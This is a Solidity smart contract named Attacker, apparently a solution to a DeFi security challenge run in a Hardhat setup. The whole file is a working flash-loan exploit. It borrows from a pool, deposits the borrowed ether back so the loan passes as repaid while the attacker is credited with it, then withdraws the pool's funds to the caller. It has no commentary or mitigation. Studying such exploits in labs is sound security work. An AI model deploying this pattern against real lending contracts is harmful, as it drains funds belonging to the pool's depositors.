// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0; 
import 'hardhat/console.sol';
import "@openzeppelin/contracts/utils/Address.sol";

interface IDeposit {
    function deposit() external payable;
    function flashLoan(uint256 ) external;
    function withdraw() external;
}

contract Attacker{
    using Address for address payable;

    function takeLoan(address _pool, uint256 amount) external {
        IDeposit(_pool).flashLoan(amount);
    }
    function execute() external payable{
        console.log("msg.value", msg.value);
        IDeposit(msg.sender).deposit{value:msg.value}();
    }
    function withdraw(address _pool) external {
        IDeposit(_pool).withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }
    receive() external payable{}
}